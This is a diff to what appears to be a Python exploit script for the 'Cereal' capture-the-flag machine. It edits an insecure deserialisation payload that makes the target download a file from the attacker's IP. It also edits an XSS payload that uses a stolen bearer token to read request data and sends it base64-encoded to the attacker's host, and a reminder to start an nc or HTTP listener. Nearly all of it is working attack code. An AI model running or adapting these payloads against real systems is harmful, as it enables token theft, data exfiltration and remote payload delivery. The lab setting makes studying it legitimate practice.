@@ -33,7 +33,7 @@ def target_cereal(ip, base_url, base_headers):
     
     print("\n=== POSTING TARGET CEREAL ===\n")
     
-    download_url = "https://{}/test.txt".format(ip)
+    download_url = "http://{}/test.txt".format(ip)
     print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))
 
     target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": " + download_url +  ",\\\"FilePath\\\":\\\"test.txt\\\"}\"}"
@@ -54,7 +54,7 @@ def xss_cereal(ip, base_url, base_headers, token, target_id):
     
     print("\n=== POSTING XSS CEREAL ===\n")
     
-    js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.responseText);console.log(resp);const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
+    js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://localhost/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.response.text + JSON.stringify(oReq.response.json) + oReq.response.blob.text());const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
     
     print("Javascript to be injected: " + js_string + "\n")
     
@@ -74,7 +74,7 @@ def main():
     warnings.filterwarnings("ignore", category=InsecureRequestWarning)
     
     # remind user to start a listener
-    print("Make sure to start a listener before this. Run the following command:\nsudo nc -lnvp 80\nThis will catch responses from your XSS and allow the DownloadHelper to grab your payload")
+    print("Make sure to start a listener before this. Run the following command:\nsudo python3 -m http.server 80\nThis will catch responses from your XSS and allow the DownloadHelper to grab your payload")
     input("Press enter to continue once you've started your listener...\n")
 
     # get tun0 IP address
